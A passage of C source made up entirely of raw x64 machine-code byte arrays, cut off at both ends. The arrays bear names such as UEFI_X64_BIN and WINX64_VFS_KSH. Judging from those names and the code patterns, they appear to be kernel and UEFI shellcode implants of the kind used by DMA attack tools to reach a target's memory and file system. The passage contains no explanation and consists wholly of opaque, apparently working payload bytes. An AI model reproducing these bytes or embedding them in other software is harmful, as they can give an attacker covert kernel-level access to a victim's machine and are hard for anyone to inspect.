    0x01, 0x00, 0x00, 0x00, 0x48, 0x8b, 0x46, 0x30, 0x49, 0x0b, 0xc4, 0x48,
    0x89, 0x43, 0x28, 0x48, 0x8b, 0x83, 0xf8, 0x0f, 0x00, 0x00, 0x4c, 0x89,
    0x73, 0x30, 0x48, 0x85, 0xc0, 0x75, 0x36, 0x49, 0x03, 0xfe, 0x48, 0xb8,
    0x00, 0xe4, 0x0b, 0x54, 0x02, 0x00, 0x00, 0x00, 0x48, 0x3b, 0xf8, 0x76,
    0xde, 0x48, 0x83, 0x64, 0x24, 0x20, 0x00, 0x48, 0x8d, 0x15, 0xfe, 0x0c,
    0x00, 0x00, 0x48, 0x8b, 0x8b, 0x20, 0x03, 0x00, 0x00, 0x45, 0x33, 0xc9,
    0x41, 0xb8, 0x37, 0x89, 0x41, 0x00, 0xe8, 0x3f, 0xfe, 0xff, 0xff, 0xeb,
    0xba, 0x48, 0xc7, 0x43, 0x30, 0x02, 0x00, 0x00, 0x00, 0x48, 0x83, 0xf8,
    0x03, 0x0f, 0x84, 0xe3, 0x00, 0x00, 0x00, 0x48, 0x83, 0xf8, 0x04, 0x75,
    0x0f, 0x48, 0x8b, 0xcb, 0xe8, 0x6b, 0xfe, 0xff, 0xff, 0x48, 0x63, 0xc8,
    0x48, 0x89, 0x4b, 0x38, 0x48, 0x83, 0xbb, 0xf8, 0x0f, 0x00, 0x00, 0x05,
    0x75, 0x18, 0x4c, 0x8d, 0x83, 0x20, 0x02, 0x00, 0x00, 0x48, 0x8b, 0xcb,
    0x48, 0x8d, 0x93, 0x20, 0x01, 0x00, 0x00, 0xff, 0x53, 0x28, 0x4c, 0x89,
    0x73, 0x38, 0x4c, 0x39, 0xb3, 0xf8, 0x0f, 0x00, 0x00, 0x75, 0x1f, 0x4c,
    0x8b, 0x43, 0x40, 0x4c, 0x8b, 0x4b, 0x48, 0x4d, 0x0b, 0xc4, 0x48, 0x8b,
    0x53, 0x28, 0x48, 0x8b, 0x8b, 0x10, 0x03, 0x00, 0x00, 0xe8, 0xd0, 0xfd,
    0xff, 0xff, 0x4c, 0x89, 0x73, 0x38, 0x48, 0x83, 0xbb, 0xf8, 0x0f, 0x00,
    0x00, 0x02, 0x75, 0x1f, 0x48, 0x8b, 0x53, 0x40, 0x4c, 0x8b, 0x4b, 0x48,
    0x49, 0x0b, 0xd4, 0x4c, 0x8b, 0x43, 0x28, 0x48, 0x8b, 0x8b, 0x10, 0x03,
    0x00, 0x00, 0xe8, 0xa7, 0xfd, 0xff, 0xff, 0x4c, 0x89, 0x73, 0x38, 0x48,
    0x83, 0xbb, 0xf8, 0x0f, 0x00, 0x00, 0x06, 0x75, 0x1c, 0x4c, 0x8b, 0x4b,
    0x48, 0x4c, 0x8b, 0x43, 0x40, 0x48, 0x8b, 0x53, 0x28, 0x48, 0x8b, 0x8b,
    0x10, 0x03, 0x00, 0x00, 0xe8, 0x81, 0xfd, 0xff, 0xff, 0x4c, 0x89, 0x73,
    0x38, 0x48, 0x83, 0xbb, 0xf8, 0x0f, 0x00, 0x00, 0x07, 0x75, 0x1c, 0x4c,
    0x8b, 0x4b, 0x48, 0x4c, 0x8b, 0x43, 0x28, 0x48, 0x8b, 0x53, 0x40, 0x48,
    0x8b, 0x8b, 0x10, 0x03, 0x00, 0x00, 0xe8, 0x5b, 0xfd, 0xff, 0xff, 0x4c,
    0x89, 0x73, 0x38, 0x48, 0x83, 0xa3, 0xf8, 0x0f, 0x00, 0x00, 0x00, 0x33,
    0xff, 0xe9, 0xc5, 0xfe, 0xff, 0xff, 0x4c, 0x8b, 0x43, 0x18, 0x48, 0x8b,
    0xd6, 0x48, 0x8b, 0x8b, 0x30, 0x03, 0x00, 0x00, 0x49, 0xc1, 0xe8, 0x0c,
    0x4c, 0x89, 0x7b, 0x30, 0xe8, 0x2d, 0xfd, 0xff, 0xff, 0x48, 0x8b, 0x8b,
    0x08, 0x03, 0x00, 0x00, 0x48, 0x83, 0x63, 0x20, 0x00, 0x48, 0x83, 0x63,
    0x28, 0x00, 0x48, 0x83, 0x23, 0x00, 0x48, 0x83, 0xa3, 0xf8, 0x0f, 0x00,
    0x00, 0x00, 0x4c, 0x89, 0x73, 0x38, 0xe8, 0x07, 0xfd, 0xff, 0xff, 0x48,
    0x8b, 0x5c, 0x24, 0x50, 0x48, 0x8b, 0x74, 0x24, 0x58, 0x48, 0x8b, 0x7c,
    0x24, 0x60, 0x48, 0x83, 0xc4, 0x30, 0x41, 0x5f, 0x41, 0x5e, 0x41, 0x5c,
    0xc3
};

const BYTE UEFI_X64_BIN[] = {
    0xeb, 0x0e, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x53, 0x51, 0x52, 0x57, 0x56, 0x41, 0x50, 0x41,
    0x51, 0x41, 0x52, 0x41, 0x53, 0x41, 0x54, 0x41, 0x55, 0x41, 0x56, 0x41,
    0x57, 0x55, 0x8b, 0x05, 0xdc, 0xff, 0xff, 0xff, 0x8b, 0x0d, 0xda, 0xff,
    0xff, 0xff, 0x89, 0x08, 0x48, 0x8d, 0x0d, 0xc5, 0xff, 0xff, 0xff, 0x48,
    0x81, 0xe9, 0x00, 0x10, 0x00, 0x00, 0x8b, 0x15, 0xbc, 0xff, 0xff, 0xff,
    0x48, 0x8b, 0xec, 0x48, 0x83, 0xec, 0x20, 0x48, 0x83, 0xe4, 0xf0, 0xe8,
    0xc4, 0x01, 0x00, 0x00, 0x48, 0x8b, 0xe5, 0x5d, 0x41, 0x5f, 0x41, 0x5e,
    0x41, 0x5d, 0x41, 0x5c, 0x41, 0x5b, 0x41, 0x5a, 0x41, 0x59, 0x41, 0x58,
    0x5e, 0x5f, 0x5a, 0x59, 0x5b, 0x8b, 0x05, 0x95, 0xff, 0xff, 0xff, 0xff,
    0xe0, 0x8b, 0x05, 0x85, 0xff, 0xff, 0xff, 0x48, 0x83, 0xc0, 0x60, 0x48,
    0x8b, 0x00, 0x49, 0x03, 0xc2, 0x48, 0x8b, 0x00, 0xff, 0xe0, 0x49, 0xc7,
    0xc2, 0x38, 0x00, 0x00, 0x00, 0xeb, 0xe2, 0x49, 0xc7, 0xc2, 0x68, 0x01,
    0x00, 0x00, 0xeb, 0xd9, 0x49, 0xc7, 0xc2, 0x60, 0x01, 0x00, 0x00, 0xeb,
    0xd0, 0x49, 0xc7, 0xc2, 0x00, 0x01, 0x00, 0x00, 0xeb, 0xc7, 0x49, 0xc7,
    0xc2, 0x28, 0x00, 0x00, 0x00, 0xeb, 0xbe, 0x49, 0xc7, 0xc2, 0x30, 0x00,
    0x00, 0x00, 0xeb, 0xb5, 0x4c, 0x8b, 0xdc, 0x53, 0x55, 0x56, 0x57, 0x48,
    0x83, 0xec, 0x38, 0x48, 0x8b, 0x41, 0x18, 0x4d, 0x8d, 0x4b, 0x10, 0x48,
    0x8b, 0xd9, 0x4d, 0x8d, 0x43, 0x20, 0xb9, 0x00, 0x00, 0x10, 0x00, 0x33,
    0xed, 0x48, 0x2b, 0xc1, 0x33, 0xf6, 0x49, 0x89, 0x43, 0x08, 0x33, 0xff,
    0x48, 0x8b, 0x53, 0x20, 0x49, 0x8d, 0x43, 0x18, 0x48, 0x03, 0xd1, 0x49,
    0x89, 0x43, 0xc8, 0x49, 0x8d, 0x4b, 0x08, 0xe8, 0x86, 0xff, 0xff, 0xff,
    0x48, 0x85, 0xc0, 0x74, 0x07, 0x33, 0xc0, 0xe9, 0x86, 0x00, 0x00, 0x00,
    0x4c, 0x8b, 0x4c, 0x24, 0x60, 0x4d, 0x85, 0xc9, 0x74, 0x2c, 0x4c, 0x8b,
    0x43, 0x20, 0x49, 0x81, 0xc0, 0x08, 0x00, 0x10, 0x00, 0x49, 0x8b, 0x50,
    0x10, 0x48, 0xc1, 0xe2, 0x0c, 0x49, 0x03, 0x10, 0x48, 0x3b, 0xfa, 0x48,
    0x0f, 0x46, 0xfa, 0x48, 0x03, 0x6c, 0x24, 0x68, 0x4c, 0x03, 0x44, 0x24,
    0x68, 0x49, 0x3b, 0xe9, 0x72, 0xdf, 0x48, 0x8b, 0x43, 0x20, 0x48, 0xc7,
    0x43, 0x48, 0x10, 0x00, 0x00, 0x00, 0x48, 0x21, 0x30, 0x48, 0x8d, 0x50,
    0x08, 0x48, 0x21, 0x32, 0x48, 0x85, 0xff, 0x74, 0x30, 0x33, 0xc9, 0x48,
    0x39, 0x4c, 0x24, 0x60, 0x76, 0x1a, 0x4c, 0x8b, 0x43, 0x20, 0x49, 0x3b,
    0xb4, 0x08, 0x08, 0x00, 0x10, 0x00, 0x74, 0x27, 0x48, 0x03, 0x4c, 0x24,
    0x68, 0x48, 0x3b, 0x4c, 0x24, 0x60, 0x72, 0xea, 0xb8, 0x00, 0x10, 0x00,
    0x00, 0x48, 0x03, 0xf0, 0x48, 0x3b, 0xf7, 0x72, 0xd0, 0xb8, 0x01, 0x00,
    0x00, 0x00, 0x48, 0x83, 0xc4, 0x38, 0x5f, 0x5e, 0x5d, 0x5b, 0xc3, 0x41,
    0x8b, 0x84, 0x08, 0x00, 0x00, 0x10, 0x00, 0x83, 0xf8, 0x0d, 0x77, 0x5a,
    0x41, 0xb9, 0xfe, 0x26, 0x00, 0x00, 0x41, 0x0f, 0xa3, 0xc1, 0x73, 0x4e,
    0x4c, 0x8b, 0x12, 0x4c, 0x8b, 0x4a, 0xf8, 0x4d, 0x03, 0xca, 0x4d, 0x3b,
    0x8c, 0x08, 0x08, 0x00, 0x10, 0x00, 0x75, 0x11, 0x49, 0x8b, 0x84, 0x08,
    0x18, 0x00, 0x10, 0x00, 0x48, 0xc1, 0xe0, 0x0c, 0x49, 0x03, 0xc2, 0xeb,
    0x26, 0x4d, 0x85, 0xc9, 0x74, 0x09, 0x48, 0x83, 0x43, 0x48, 0x10, 0x48,
    0x83, 0xc2, 0x10, 0x49, 0x8b, 0x84, 0x08, 0x08, 0x00, 0x10, 0x00, 0x48,
    0x89, 0x42, 0xf8, 0x49, 0x8b, 0x84, 0x08, 0x18, 0x00, 0x10, 0x00, 0x48,
    0xc1, 0xe0, 0x0c, 0x48, 0x89, 0x02, 0x49, 0x8b, 0x84, 0x08, 0x18, 0x00,
    0x10, 0x00, 0x48, 0xc1, 0xe0, 0x0c, 0xe9, 0x72, 0xff, 0xff, 0xff, 0xcc,
    0x48, 0x89, 0x5c, 0x24, 0x10, 0x48, 0x89, 0x6c, 0x24, 0x18, 0x57, 0x48,
    0x83, 0xec, 0x20, 0x48, 0x8b, 0xda, 0x45, 0x33, 0xc0, 0xba, 0x00, 0x10,
    0x00, 0x00, 0x48, 0x8b, 0xf9, 0xe8, 0x59, 0xfe, 0xff, 0xff, 0xba, 0x04,
    0x00, 0x00, 0x00, 0x48, 0xc7, 0x47, 0x50, 0x10, 0x00, 0x00, 0x00, 0x48,
    0xb8, 0x77, 0x33, 0x33, 0x11, 0x77, 0x33, 0x11, 0xff, 0x4c, 0x8d, 0x4c,
    0x24, 0x30, 0x48, 0x89, 0x07, 0xbd, 0xff, 0xff, 0xff, 0xff, 0x48, 0x89,
    0x5f, 0x58, 0x41, 0xb8, 0x00, 0x10, 0x00, 0x00, 0x8d, 0x5a, 0xfd, 0x48,
    0x89, 0x6c, 0x24, 0x30, 0x8b, 0xcb, 0x48, 0xc7, 0x47, 0x18, 0x00, 0x00,
    0x00, 0x01, 0xe8, 0x2f, 0xfe, 0xff, 0xff, 0x48, 0x85, 0xc0, 0x74, 0x31,
    0x4c, 0x8d, 0x4c, 0x24, 0x30, 0x48, 0x89, 0x6c, 0x24, 0x30, 0x8d, 0x53,
    0x03, 0x48, 0xc7, 0x47, 0x18, 0x00, 0x00, 0x40, 0x00, 0x41, 0xb8, 0x00,
    0x04, 0x00, 0x00, 0x8b, 0xcb, 0xe8, 0x08, 0xfe, 0xff, 0xff, 0x48, 0x85,
    0xc0, 0x74, 0x0a, 0xb8, 0x02, 0x00, 0x00, 0xf0, 0xe9, 0x08, 0x01, 0x00,
    0x00, 0x48, 0x8b, 0x44, 0x24, 0x30, 0x45, 0x33, 0xc9, 0x45, 0x33, 0xc0,
    0x48, 0x89, 0x47, 0x20, 0x33, 0xd2, 0x48, 0x89, 0x47, 0x28, 0x33, 0xc9,
    0xe8, 0xd4, 0xfd, 0xff, 0xff, 0x48, 0x89, 0x87, 0x30, 0x02, 0x00, 0x00,
    0x48, 0x8b, 0x87, 0xf8, 0x0f, 0x00, 0x00, 0x48, 0x89, 0x5f, 0x30, 0x48,
    0x85, 0xc0, 0x74, 0xf0, 0x48, 0xc7, 0x47, 0x30, 0x02, 0x00, 0x00, 0x00,
    0x48, 0x83, 0xf8, 0x03, 0x0f, 0x84, 0x93, 0x00, 0x00, 0x00, 0x48, 0x83,
    0xf8, 0x04, 0x75, 0x0f, 0x48, 0x8b, 0xcf, 0xe8, 0xb8, 0xfd, 0xff, 0xff,
    0x48, 0x63, 0xc8, 0x48, 0x89, 0x4f, 0x38, 0x48, 0x83, 0xbf, 0xf8, 0x0f,
    0x00, 0x00, 0x05, 0x75, 0x18, 0x4c, 0x8d, 0x87, 0x20, 0x02, 0x00, 0x00,
    0x48, 0x8b, 0xcf, 0x48, 0x8d, 0x97, 0x20, 0x01, 0x00, 0x00, 0xff, 0x57,
    0x20, 0x48, 0x89, 0x5f, 0x38, 0x48, 0x8b, 0x87, 0xf8, 0x0f, 0x00, 0x00,
    0x48, 0x3b, 0xc3, 0x74, 0x06, 0x48, 0x83, 0xf8, 0x06, 0x75, 0x15, 0x4c,
    0x8b, 0x47, 0x48, 0x48, 0x8b, 0x57, 0x40, 0x48, 0x8b, 0x4f, 0x20, 0xe8,
    0x48, 0xfd, 0xff, 0xff, 0x48, 0x89, 0x5f, 0x38, 0x48, 0x8b, 0x87, 0xf8,
    0x0f, 0x00, 0x00, 0x48, 0x83, 0xf8, 0x02, 0x74, 0x06, 0x48, 0x83, 0xf8,
    0x07, 0x75, 0x15, 0x4c, 0x8b, 0x47, 0x48, 0x48, 0x8b, 0x57, 0x20, 0x48,
    0x8b, 0x4f, 0x40, 0xe8, 0x20, 0xfd, 0xff, 0xff, 0x48, 0x89, 0x5f, 0x38,
    0x48, 0x83, 0xa7, 0xf8, 0x0f, 0x00, 0x00, 0x00, 0xe9, 0x4b, 0xff, 0xff,
    0xff, 0x48, 0x8b, 0x57, 0x18, 0x48, 0x8b, 0x4f, 0x20, 0x48, 0xc1, 0xea,
    0x0c, 0xe8, 0x19, 0xfd, 0xff, 0xff, 0x48, 0x83, 0x67, 0x20, 0x00, 0xb8,
    0x00, 0x00, 0x00, 0xf0, 0x48, 0x83, 0x67, 0x28, 0x00, 0x48, 0x83, 0x27,
    0x00, 0x48, 0x83, 0xa7, 0xf8, 0x0f, 0x00, 0x00, 0x00, 0x48, 0x89, 0x5f,
    0x38, 0x48, 0x8b, 0x5c, 0x24, 0x38, 0x48, 0x8b, 0x6c, 0x24, 0x40, 0x48,
    0x89, 0x47, 0x30, 0x48, 0x83, 0xc4, 0x20, 0x5f, 0xc3
};


const BYTE WINX64_VFS_KSH[] = {
  0x37, 0x13, 0xec, 0x3c, 0x6a, 0x4a, 0x8b, 0x7e, 0xf0, 0xdd, 0xff, 0xd4, 0x0a, 0x09, 0xcb, 0x46,
  0x1c, 0x45, 0x43, 0x88, 0x93, 0x13, 0x90, 0xf8, 0x4c, 0x66, 0x6d, 0x4c, 0x6d, 0x44, 0x5b, 0xea,
  0x86, 0x53, 0xd9, 0xea, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x1b, 0x0b, 0x00, 0x00,
  0x00, 0x00, 0x00, 0x00, 0xb6, 0x1a, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x64, 0x00, 0x00, 0x00,
  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
  0x00, 0x00, 0x00, 0x00, 0x56, 0x48, 0x8b, 0xf4, 0x48, 0x83, 0xe4, 0xf0, 0x48, 0x83, 0xec, 0x20,
  0xe8, 0xdb, 0x07, 0x00, 0x00, 0x48, 0x8b, 0xe6, 0x5e, 0xc3, 0x0f, 0x20, 0xd8, 0xc3, 0x0f, 0x09,
  0xc3, 0xcc, 0xcc, 0xcc, 0x48, 0x89, 0x5c, 0x24, 0x08, 0x48, 0x89, 0x7c, 0x24, 0x18, 0x55, 0x48,
  0x8d, 0x6c, 0x24, 0xa9, 0x48, 0x81, 0xec, 0xb0, 0x00, 0x00, 0x00, 0x48, 0x83, 0x65, 0x6f, 0x00,
  0x48, 0x8d, 0x4d, 0x17, 0x48, 0x8b, 0xfa, 0x49, 0x8b, 0xd8, 0xba, 0x10, 0x00, 0x00, 0x00, 0xff,
  0x97, 0x80, 0x00, 0x00, 0x00, 0xba, 0x30, 0x00, 0x00, 0x00, 0x48, 0x8d, 0x4d, 0x27, 0xff, 0x97,
  0x80, 0x00, 0x00, 0x00, 0x48, 0x8d, 0x93, 0x1c, 0x01, 0x00, 0x00, 0x48, 0x8d, 0x4d, 0x07, 0xff,
  0x57, 0x78, 0x83, 0x64, 0x24, 0x50, 0x00, 0x48, 0x8d, 0x45, 0x07, 0x48, 0x83, 0x64, 0x24, 0x48,
  0x00, 0x4c, 0x8d, 0x4d, 0x17, 0x48, 0x83, 0x65, 0x2f, 0x00, 0x4c, 0x8d, 0x45, 0x27, 0xc7, 0x44,
  0x24, 0x40, 0x20, 0x00, 0x00, 0x00, 0x48, 0x8d, 0x4d, 0x6f, 0x48, 0x89, 0x45, 0x37, 0x0f, 0x57,
  0xc0, 0xb8, 0x03, 0x00, 0x00, 0x00, 0x48, 0xc7, 0x45, 0x27, 0x30, 0x00, 0x00, 0x00, 0x89, 0x44,
  0x24, 0x38, 0xba, 0x00, 0x00, 0x00, 0x80, 0x89, 0x44, 0x24, 0x30, 0xc7, 0x44, 0x24, 0x28, 0x80,
  0x00, 0x00, 0x00, 0x48, 0x83, 0x64, 0x24, 0x20, 0x00, 0x48, 0xc7, 0x45, 0x3f, 0x40, 0x02, 0x00,
  0x00, 0xf3, 0x0f, 0x7f, 0x45, 0x47, 0xff, 0x97, 0x90, 0x00, 0x00, 0x00, 0x48, 0x8b, 0x4d, 0x6f,
  0x8b, 0xd8, 0x48, 0x85, 0xc9, 0x74, 0x06, 0xff, 0x97, 0x88, 0x00, 0x00, 0x00, 0x4c, 0x8d, 0x9c,
  0x24, 0xb0, 0x00, 0x00, 0x00, 0x8b, 0xc3, 0x49, 0x8b, 0x5b, 0x10, 0x49, 0x8b, 0x7b, 0x20, 0x49,
  0x8b, 0xe3, 0x5d, 0xc3, 0x48, 0x89, 0x5c, 0x24, 0x08, 0x48, 0x89, 0x7c, 0x24, 0x18, 0x55, 0x48,
  0x8d, 0x6c, 0x24, 0xa9, 0x48, 0x81, 0xec, 0xb0, 0x00, 0x00, 0x00, 0x48, 0x83, 0x65, 0x6f, 0x00,
  0x48, 0x8d, 0x4d, 0x17, 0x48, 0x8b, 0xfa, 0x49, 0x8b, 0xd8, 0xba, 0x10, 0x00, 0x00, 0x00, 0xff,
  0x97, 0x80, 0x00, 0x00, 0x00, 0xba, 0x30, 0x00, 0x00, 0x00, 0x48, 0x8d, 0x4d, 0x27, 0xff, 0x97,
  0x80, 0x00, 0x00, 0x00, 0x48, 0x8d, 0x93, 0x1c, 0x01, 0x00, 0x00, 0x48, 0x8d, 0x4d, 0x07, 0xff,
  0x57, 0x78, 0x83, 0x64, 0x24, 0x50, 0x00, 0x48, 0x8d, 0x45, 0x07, 0x48, 0x83, 0x64, 0x24, 0x48,
  0x00, 0x4c, 0x8d, 0x4d, 0x17, 0x48, 0x83, 0x65, 0x2f, 0x00, 0x4c, 0x8d, 0x45, 0x27, 0xc7, 0x44,
  0x24, 0x40, 0x00, 0x10, 0x00, 0x00, 0x48, 0x8d, 0x4d, 0x6f, 0xc7, 0x44, 0x24, 0x38, 0x01, 0x00,
  0x00, 0x00, 0x0f, 0x57, 0xc0, 0xc7, 0x44, 0x24, 0x30, 0x04, 0x00, 0x00, 0x00, 0xba, 0x00, 0x00,
  0x00, 0x40, 0xc7, 0x44, 0x24, 0x28, 0x80, 0x00, 0x00, 0x00, 0x48, 0x83, 0x64, 0x24, 0x20, 0x00,
  0x48, 0xc7, 0x45, 0x27, 0x30, 0x00, 0x00, 0x00, 0x48, 0xc7, 0x45, 0x3f, 0x40, 0x02, 0x00, 0x00,
  0x48, 0x89, 0x45, 0x37, 0xf3, 0x0f, 0x7f, 0x45, 0x47, 0xff, 0x97, 0x90, 0x00, 0x00, 0x00, 0x48,
  0x8b, 0x4d, 0x6f, 0x8b, 0xd8, 0x48, 0x85, 0xc9, 0x74, 0x06, 0xff, 0x97, 0x88, 0x00, 0x00, 0x00,
  0x4c, 0x8d, 0x9c, 0x24, 0xb0, 0x00, 0x00, 0x00, 0x8b, 0xc3, 0x49, 0x8b, 0x5b, 0x10, 0x49, 0x8b,
  0x7b, 0x20, 0x49, 0x8b, 0xe3, 0x5d, 0xc3, 0xcc, 0x48, 0x8b, 0xc4, 0x48, 0x89, 0x58, 0x10, 0x48,
  0x89, 0x70, 0x18, 0x48, 0x89, 0x78, 0x20, 0x55, 0x41, 0x56, 0x41, 0x57, 0x48, 0x8d, 0x68, 0xa1,
  0x48, 0x81, 0xec, 0x90, 0x00, 0x00, 0x00, 0x48, 0x8b, 0xb9, 0x08, 0x02, 0x00, 0x00, 0x45, 0x33,
  0xff, 0x48, 0x03, 0x79, 0x28, 0x41, 0x8a, 0xdf, 0x66, 0x44, 0x89, 0x7d, 0xf5, 0x4c, 0x8b, 0xf2,
  0x48, 0x8b, 0xf1, 0xc7, 0x45, 0xe7, 0x5c, 0x00, 0x3f, 0x00, 0xc7, 0x45, 0xeb, 0x3f, 0x00, 0x5c,
  0x00, 0xc7, 0x45, 0xf1, 0x3a, 0x00, 0x5c, 0x00, 0x44, 0x88, 0x3f, 0x48, 0x8d, 0x4d, 0x07, 0x0f,
  0xb6, 0xc3, 0xba, 0x10, 0x00, 0x00, 0x00, 0x66, 0x83, 0xc0, 0x61, 0x4c, 0x89, 0x7d, 0x67, 0x66,
  0x89, 0x45, 0xef, 0x41, 0xff, 0x96, 0x80, 0x00, 0x00, 0x00, 0xba, 0x30, 0x00, 0x00, 0x00, 0x48,
  0x8d, 0x4d, 0x17, 0x41, 0xff, 0x96, 0x80, 0x00, 0x00, 0x00, 0x48, 0x8d, 0x55, 0xe7, 0x48, 0x8d,
  0x4d, 0xf7, 0x41, 0xff, 0x56, 0x78, 0x48, 0x8d, 0x45, 0xf7, 0xc7, 0x44, 0x24, 0x28, 0x21, 0x40,
  0x00, 0x00, 0x0f, 0x57, 0xc0, 0x48, 0x89, 0x45, 0x27, 0x4c, 0x8d, 0x4d, 0x07, 0x48, 0xc7, 0x45,
  0x17, 0x30, 0x00, 0x00, 0x00, 0x4c, 0x8d, 0x45, 0x17, 0x4c, 0x89, 0x7d, 0x1f, 0xba, 0x01, 0x00,
  0x10, 0x00, 0x48, 0xc7, 0x45, 0x2f, 0x40, 0x02, 0x00, 0x00, 0x48, 0x8d, 0x4d, 0x67, 0xc7, 0x44,
  0x24, 0x20, 0x03, 0x00, 0x00, 0x00, 0xf3, 0x0f, 0x7f, 0x45, 0x37, 0x41, 0xff, 0x96, 0x98, 0x00,
  0x00, 0x00, 0x4c, 0x39, 0x7d, 0x67, 0x74, 0x10, 0x8d, 0x43, 0x61, 0x88, 0x07, 0x48, 0x8b, 0x4d,
  0x67, 0x41, 0xff, 0x96, 0x88, 0x00, 0x00, 0x00, 0xfe, 0xc3, 0x48, 0xff, 0xc7, 0x80, 0xfb, 0x1a,
  0x0f, 0x82, 0x52, 0xff, 0xff, 0xff, 0x4c, 0x8d, 0x9c, 0x24, 0x90, 0x00, 0x00, 0x00, 0x48, 0xc7,
  0x86, 0x00, 0x02, 0x00, 0x00, 0x1a, 0x00, 0x00, 0x00, 0x49, 0x8b, 0x5b, 0x28, 0x49, 0x8b, 0x73,
  0x30, 0x49, 0x8b, 0x7b, 0x38, 0x49, 0x8b, 0xe3, 0x41, 0x5f, 0x41, 0x5e, 0x5d, 0xc3, 0xcc, 0xcc,
  0x48, 0x8b, 0xc4, 0x48, 0x89, 0x58, 0x10, 0x48, 0x89, 0x70, 0x18, 0x48, 0x89, 0x78, 0x20, 0x55,
  0x41, 0x54, 0x41, 0x55, 0x41, 0x56, 0x41, 0x57, 0x48, 0x8d, 0x68, 0xa1, 0x48, 0x81, 0xec, 0xb0,
  0x00, 0x00, 0x00, 0x33, 0xc0, 0x48, 0x8b, 0xd9, 0x48, 0x8b, 0x89, 0x10, 0x02, 0x00, 0x00, 0x49,
  0x8b, 0xf8, 0x48, 0x89, 0x45, 0x67, 0x4c, 0x8b, 0xfa, 0x44, 0x8b, 0xf0, 0x48, 0x81, 0xf9, 0x00,
  0x00, 0x20, 0x00, 0x73, 0x0a, 0xb8, 0x07, 0x00, 0x00, 0xf0, 0xe9, 0xd5, 0x01, 0x00, 0x00, 0x4c,
  0x8b, 0x63, 0x28, 0x48, 0x81, 0xc1, 0x00, 0x00, 0xf0, 0xff, 0x4c, 0x03, 0xa3, 0x08, 0x02, 0x00,
  0x00, 0x48, 0xb8, 0x8f, 0xe3, 0x38, 0x8e, 0xe3, 0x38, 0x8e, 0xe3, 0x48, 0xf7, 0xe1, 0x48, 0x8d,
  0x4d, 0xe7, 0x4c, 0x8b, 0xea, 0xba, 0x10, 0x00, 0x00, 0x00, 0x49, 0xc1, 0xed, 0x09, 0x41, 0xff,
  0x97, 0x80, 0x00, 0x00, 0x00, 0xbe, 0x30, 0x00, 0x00, 0x00, 0x48, 0x8d, 0x4d, 0x07, 0x8b, 0xd6,
  0x41, 0xff, 0x97, 0x80, 0x00, 0x00, 0x00, 0x48, 0x8d, 0x97, 0x1c, 0x01, 0x00, 0x00, 0x48, 0x8d,
  0x4d, 0xf7, 0x41, 0xff, 0x57, 0x78, 0x4c, 0x21, 0x75, 0x0f, 0x48, 0x8d, 0x45, 0xf7, 0x0f, 0x57,
  0xc0, 0xc7, 0x44, 0x24, 0x28, 0x21, 0x40, 0x00, 0x00, 0x4c, 0x8d, 0x4d, 0xe7, 0x48, 0x89, 0x45,
  0x17, 0x4c, 0x8d, 0x45, 0x07, 0x48, 0x89, 0x75, 0x07, 0xba, 0x01, 0x00, 0x10, 0x00, 0x48, 0xc7,
  0x45, 0x1f, 0x40, 0x02, 0x00, 0x00, 0x48, 0x8d, 0x4d, 0x67, 0xc7, 0x44, 0x24, 0x20, 0x03, 0x00,
  0x00, 0x00, 0xf3, 0x0f, 0x7f, 0x45, 0x27, 0x41, 0xff, 0x97, 0x98, 0x00, 0x00, 0x00, 0x33, 0xd2,
  0x8b, 0xf8, 0x85, 0xc0, 0x0f, 0x85, 0x01, 0x01, 0x00, 0x00, 0xc6, 0x44, 0x24, 0x50, 0x01, 0xe9,
  0x96, 0x00, 0x00, 0x00, 0x48, 0x39, 0x55, 0xef, 0x0f, 0x84, 0xed, 0x00, 0x00, 0x00, 0xba, 0x40,
  0x02, 0x00, 0x00, 0x49, 0x8b, 0xcc, 0x41, 0xff, 0x97, 0x80, 0x00, 0x00, 0x00, 0x48, 0x8b, 0x46,
  0x28, 0x48, 0x8d, 0x56, 0x5e, 0x49, 0x89, 0x44, 0x24, 0x30, 0x48, 0x8b, 0x46, 0x10, 0x49, 0x89,
  0x44, 0x24, 0x08, 0x48, 0x8b, 0x46, 0x08, 0x49, 0x89, 0x44, 0x24, 0x18, 0x48, 0x8b, 0x46, 0x20,
  0x49, 0x83, 0x0c, 0x24, 0x10, 0x49, 0x89, 0x44, 0x24, 0x10, 0x8b, 0x46, 0x38, 0x24, 0x10, 0xf6,
  0xd8, 0x48, 0x1b, 0xc9, 0x48, 0xf7, 0xd9, 0x48, 0xff, 0xc1, 0x49, 0x09, 0x0c, 0x24, 0xb9, 0x03,
  0x01, 0x00, 0x00, 0x8b, 0x46, 0x3c, 0x3b, 0xc1, 0x0f, 0x47, 0xc1, 0x49, 0x8d, 0x4c, 0x24, 0x38,
  0x44, 0x8b, 0xc0, 0x41, 0xff, 0x57, 0x60, 0x33, 0xd2, 0x49, 0x81, 0xc4, 0x40, 0x02, 0x00, 0x00,
  0x49, 0xff, 0xc6, 0x4d, 0x3b, 0xf5, 0x73, 0x73, 0x8b, 0x06, 0x85, 0xc0, 0x74, 0x08, 0x48, 0x03,
  0xf0, 0xe9, 0x78, 0xff, 0xff, 0xff, 0x88, 0x54, 0x24, 0x50, 0x48, 0x8b, 0x8b, 0x08, 0x02, 0x00,
  0x00, 0x48, 0x8d, 0x45, 0xe7, 0x48, 0x03, 0x8b, 0x10, 0x02, 0x00, 0x00, 0x45, 0x33, 0xc9, 0x48,
  0x8b, 0x73, 0x28, 0x45, 0x33, 0xc0, 0x48, 0x89, 0x54, 0x24, 0x48, 0x48, 0x81, 0xc6, 0x00, 0x00,
  0xf0, 0xff, 0x88, 0x54, 0x24, 0x40, 0x48, 0x03, 0xf1, 0x48, 0x8b, 0x4d, 0x67, 0x48, 0xc7, 0x44,
  0x24, 0x38, 0x03, 0x00, 0x00, 0x00, 0xc7, 0x44, 0x24, 0x30, 0x00, 0x00, 0x10, 0x00, 0x48, 0x89,
  0x74, 0x24, 0x28, 0x48, 0x89, 0x44, 0x24, 0x20, 0x41, 0xff, 0x97, 0xa0, 0x00, 0x00, 0x00, 0x33,
